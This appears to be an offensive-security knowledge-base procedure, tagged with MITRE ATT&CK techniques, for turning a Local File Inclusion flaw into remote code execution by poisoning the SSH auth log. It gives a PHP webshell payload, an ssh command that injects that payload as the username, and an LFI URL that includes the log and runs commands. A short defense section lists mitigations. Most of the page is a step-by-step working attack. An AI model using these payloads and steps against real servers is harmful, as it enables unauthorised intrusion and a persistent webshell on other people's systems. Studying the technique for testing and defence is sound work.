---
id: f757a935-e587-4012-8acd-7bda15f9d1f6
name: LFI-to-RCE-via-SSH-Log-File-Inclusion
type: procedure
verified: true
submitted: false
created_at: '2023-04-06T03:55:58.581638+00:00'
updated_at: '2023-10-01T00:00:00.000000+00:00'
tactics:
  - '[[tactics/Initial Access|TA0001 - Initial Access]]'
  - '[[tactics/Execution|TA0002 - Execution]]'
techniques:
  - >-
    [[techniques/Exploitation of Remote Services|T1210 - Exploitation of Remote
    Services]]
  - >-
    [[techniques/Command and Scripting Interpreter|T1059 - Command and Scripting
    Interpreter]]
sub_techniques:
  - '[[techniques/Command and Scripting Interpreter/T1059.004 - Unix Shell]]'
tags:
  - '[[tags/File Inclusion]]'
  - '[[tags/LFI]]'
  - '[[tags/RCE]]'
  - '[[tags/Log Poisoning]]'
  - '[[tags/SSH]]'
commands:
  - '[[commands/bash-print-user-id]]'
platforms:
  - Linux
  - Web
tools: []
validated: true
---

# LFI-to-RCE-via-SSH-Log-File-Inclusion

## Summary

This procedure exploits a Local File Inclusion (LFI) vulnerability in a web application to achieve Remote Code Execution (RCE) by poisoning the SSH authentication log file (/var/log/auth.log) with malicious PHP code. An attacker triggers a failed SSH connection using the PHP payload as the username, which gets logged, and then uses the LFI to include the log file, executing the embedded PHP code to run arbitrary commands on the server.

## Description

Local File Inclusion vulnerabilities allow attackers to include files on the server that are not intended to be part of the application, often leading to information disclosure or, in this case, code execution when combined with log poisoning. This technique targets web applications running on Linux systems with SSH enabled, where the web server process has read access to log files. The attack assumes the LFI parameter (e.g., ?page=) allows traversal to /var/log/auth.log without null-byte filtering or other restrictions. Once the log is poisoned, the attacker can pass commands via a GET parameter to the included PHP, enabling shell command execution. This is particularly effective against applications using PHP, as the log inclusion parses the PHP in the log file. The procedure requires network access to both SSH and the web application ports.

## Requirements

1. Network access to the target's SSH port (typically 22) and web application port (typically 80/443).
2. A web application with an exploitable LFI vulnerability, such as an unsanitized file inclusion parameter (e.g., index.php?page=/etc/passwd).
3. The web server must have read access to /var/log/auth.log (common in default configurations).
4. SSH service must be running and logging failed authentication attempts to auth.log.
5. No authentication required for the LFI endpoint.

## Defense

- Implement strict input validation and sanitization for file inclusion parameters, using whitelists instead of blacklists.
- Disable directory traversal by ensuring file paths are resolved within the web root only.
- Monitor and restrict web server access to sensitive files like logs using chroot or AppArmor/SELinux policies.
- Regularly audit and rotate log files, and monitor for anomalous entries in auth.log (e.g., PHP-like code in usernames).
- Use web application firewalls (WAFs) to detect LFI patterns and log poisoning attempts.

## Objectives

1. Poison the SSH log file with executable PHP code to create a webshell entry.
2. Include the poisoned log file via the LFI vulnerability to parse and execute the PHP.
3. Execute arbitrary commands on the target system to achieve RCE and potential privilege escalation.

## Instructions

### Step 1: Poison SSH Log with PHP Payload

**Context**: Initiate a failed SSH connection using the malicious PHP code as the username. This causes the SSH daemon to log the attempt in /var/log/auth.log, embedding the PHP code. The code creates a simple webshell that executes commands passed via the 'cmd' GET parameter.

**Code** ([[codes/PHP-Webshell-System-Call]]):

```php
<?php system($_GET["cmd"]);?>
```

**Code** ([[codes/SSH-Inject-PHP-Payload]]):

```bash
ssh '<?php system($_GET["cmd"]);?>'@TARGET_IP
```

> Replace TARGET_IP with the actual target IP address. This command will fail to connect (assuming no such user exists) but logs the username in auth.log. Expected output is a connection refusal or timeout message on the attacker's side, confirming the attempt was made.

### Step 2: Trigger LFI to Include Poisoned Log

**Context**: Use the LFI vulnerability to include /var/log/auth.log, which now contains the PHP code. Append &cmd=id to execute a test command via the embedded webshell. This verifies RCE by running the 'id' command and displaying its output.

**Code** ([[codes/LFI-URL-Execute-ID-Command]]):

```url
http://TARGET_WEB/index.php?page=/var/log/auth.log&cmd=id
```

> Replace TARGET_WEB with the vulnerable web application's URL and adjust the LFI parameter if different (e.g., ?file=). Use a browser or tool like curl to access this URL. The PHP in the log will execute, running 'id' and outputting the server's user context (e.g., uid=33(www-data)). If successful, this confirms RCE; otherwise, check for LFI restrictions or log path variations (/var/log/secure on some systems).

### Step 3: Verify RCE with Command Execution

**Context**: Once the LFI inclusion works, execute the test command to confirm shell access and user privileges. This step uses the embedded webshell to run a basic system command.

**Command** ([[commands/bash-print-user-id]]):

```bash
id
```

> This command, passed via &cmd=id in the LFI URL, prints the current user ID, group ID, and effective user. Expected output appears in the browser response, showing details like 'uid=33(www-data) gid=33(www-data) groups=33(www-data)'. If www-data or another low-privilege user is shown, consider escalation techniques next.
